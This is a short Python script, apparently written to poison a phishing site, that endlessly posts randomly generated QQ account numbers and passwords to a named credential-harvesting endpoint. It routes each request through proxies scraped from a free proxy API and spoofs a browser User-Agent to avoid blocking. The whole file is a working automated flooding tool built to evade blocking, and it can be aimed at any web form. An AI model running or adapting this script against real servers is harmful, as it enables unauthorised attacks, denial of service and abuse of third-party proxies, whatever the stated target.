from urllib import request
from urllib import parse
import random
import requests
import re
import socket

# 此处为万恶的钓鱼网站服务器响应文件
posturl = 'http://jfjwuxc.cn/abc/gogo.asp'


# 生成随机QQ号
def randomQQ():
    return random.randint(100000000, 999999999)


# 生成随机密码，格式采取常用的字母在前，数字在后
def randomPassword():
    seed1 = "1234567890"
    seed2 = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
    sa = []
    for i in range(random.randint(2, 3)):
        sa.append(random.choice(seed2))
    for i in range(random.randint(6, 8)):
        sa.append(random.choice(seed1))
    salt = ''.join(sa)
    return salt


# 代理服务器响应超过10s就换下一个
socket.setdefaulttimeout(10)

totalCount = 0
successCount = 0

while True:
    # 此处为获取代理ip的api，一次获取60个，端口号设定为8080
    response = requests.get("http://www.89ip.cn/apijk/?&tqsl=100&sxa=&sxb=&tta=&ktip=&cf=1")

    # 利用正则表达式获取ip列表
    ip_list = re.findall("(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}).*?(\d{2,6})", response.text, re.S)

    for ip in ip_list:
        totalCount += 1
        print("第%d次攻击！" % totalCount)
        data = {'zh': str(randomQQ()), 'mima': str(randomPassword()), 'daqu': '不删档测试区', 'xiaoqu': '明珠港', 'dengji': '1'}
        print('账号:' + data['zh'])
        print('密码:' + data['mima'])
        ip = ip[0] + ":" + ip[1]
        print(ip)

        # 设定代理ip
        proxy = {'http': str(ip)}
        proxy_support = request.ProxyHandler(proxy)
        opener = request.build_opener(proxy_support)

        # 添加头部，使得网站不屏蔽此脚本
        opener.addheaders = [('User-Agent',
                              'Mozilla/5.0 (Linux; Android 4.1.1; Nexus 7 Build/JRO03D) AppleWebKit/535.19 (KHTML, like Gecko) Chrome/18.0.1025.166  Safari/535.19')]
        request.install_opener(opener)

        # 处理post数据
        postdata = parse.urlencode(data)
        postdata = postdata.encode('utf-8')

        try:
            response = request.urlopen(posturl, data=postdata)
        except Exception:
            print('攻击失败')
        else:
            try:
                print(response.read().decode("gbk"))
            except Exception:
                print('攻击失败')
            else:
                successCount += 1
                print('插入垃圾数据成功！成功率:' + str(successCount / totalCount * 100) + '%')
        print('\n')
